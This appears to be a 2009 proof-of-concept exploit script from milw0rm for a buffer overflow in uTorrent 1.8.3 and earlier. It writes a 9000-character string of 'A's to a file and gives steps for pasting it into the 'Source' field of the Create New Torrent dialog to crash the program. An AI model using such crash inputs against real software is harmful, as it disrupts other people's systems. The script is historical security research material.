#!/usr/bin/env python

#####################################################################################################
#
# uTorrent <= 1.8.3 (Build 15772) Create New Torrent Buffer Overflow PoC
# By: Dr_IDE
# Note: This is old but I figured I would release it if someone wanted to play with it.
# Note: This was fixed as of version 1.8.3 (Build 16010)
# Download: http://www.filehippo.com/download_utorrent/download/9219a21fa300a93e885069c992a8a925/
# Usage: File -> Create New Torrent -> Paste string into "Source" field -> Click "Add File"
#
#####################################################################################################


buff = ("\x41" * 9000)

try:
	f1 = open("uTorrent.txt","w");
	f1.write(buff);
	f1.close();

	print "\nuTorrent <= 1.8.3 (Build 15772) Create New Torrent Buffer Overflow PoC"
	print "By: Dr_IDE"
	print "\nFile Created Successfully.\n"
	print "Usage: \n[-] Click File\n[-] Create New Torrent\n[-] Paste string into \"Source\" field\n[-] Click \"Add File\""

except:
	print "Error. File couldn't be created."

# milw0rm.com [2009-08-28]